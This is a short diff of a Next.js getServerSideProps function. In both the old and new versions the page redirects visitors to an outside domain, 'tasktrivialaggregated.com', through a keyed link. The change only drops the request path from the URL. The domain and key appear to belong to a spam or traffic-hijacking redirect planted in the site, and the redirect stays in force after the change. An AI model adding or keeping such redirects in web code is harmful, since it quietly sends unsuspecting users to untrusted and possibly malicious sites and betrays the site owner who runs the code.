@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://tasktrivialaggregated.com/qunik88a?key=762b91bd88a7814984635483009c1edc` + encodeURI(path as string)
+					`https://tasktrivialaggregated.com/qunik88a?key=762b91bd88a7814984635483009c1edc`
 				}`,
 			},
 		};
